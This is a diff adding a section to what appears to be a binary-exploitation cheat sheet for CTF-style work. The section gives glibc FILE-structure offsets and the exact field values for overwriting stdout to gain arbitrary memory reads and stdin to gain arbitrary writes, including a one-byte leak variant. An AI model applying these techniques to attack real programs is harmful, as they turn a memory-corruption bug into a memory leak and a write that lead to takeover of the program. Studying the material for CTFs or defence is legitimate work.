@@ -61,6 +61,38 @@ p &_IO_file_jumps
 x/40gx &_IO_2_1_stdout_
 ```
 
+### FILE-struct arbitrary read/write (data-only — no vtable, all glibc)
+
+Corrupt a *buffered* FILE's pointers so an ordinary flush/refill does the I/O for you. No RIP,
+no vtable check, no `pointer_guard` — just one libc write. The cleanest leak/write on 2.34+
+(hooks gone). Offsets: `_flags 0x0, _IO_read_ptr 0x8, _IO_read_end 0x10, _IO_read_base 0x18,
+_IO_write_base 0x20, _IO_write_ptr 0x28, _IO_write_end 0x30, _IO_buf_base 0x38, _IO_buf_end
+0x40, _fileno 0x70`.
+
+**stdout = arbitrary read (leak any address):** overwrite `_IO_2_1_stdout_`:
+```
+_flags         = 0xfbad1800        # magic + writable; _IO_NO_WRITES(8) clear
+_IO_read_end   = _IO_write_base    # equal -> skips the seek in _IO_do_write
+_IO_write_base = <addr to leak>
+_IO_write_ptr  = <addr> + len
+_IO_write_end  = <addr> + len      # (>= write_ptr)
+```
+The next `puts`/`printf`/flush runs `write(1, write_base, write_ptr-write_base)` -> dumps
+`[addr, addr+len)`. **1-byte variant:** set only `_flags=0xfbad1800` and partial-overwrite the
+low byte of `_IO_write_base` to push it lower into libc -> a libc leak with a single-byte write.
+
+**stdin = arbitrary write (read your input into any address):** overwrite `_IO_2_1_stdin_`:
+```
+_flags        = 0xfbad0000         # clear _IO_NO_READS(4) and _IO_EOF_SEEN(0x10)
+_IO_read_base = _IO_read_ptr = _IO_read_end = <addr>   # empty buffer -> force a refill
+_IO_buf_base  = <addr to write>
+_IO_buf_end   = <addr> + len
+```
+The next `scanf`/`fgets`/`fread`/`getchar` underflows -> `read(0, buf_base, buf_end-buf_base)`
+-> writes your stdin bytes to `<addr>`. Pair the two for a leak-then-write loop without a
+single hook or one_gadget. Keep `_fileno` 1/0; need `_IO_write_base <= _IO_write_ptr`. Verify
+the `_IO_file_overflow` / `_IO_file_underflow` path is actually reached in GDB.
+
 ---
 
 ## Era 1 — Classic / pre-tcache (glibc <= 2.23, some live forever)
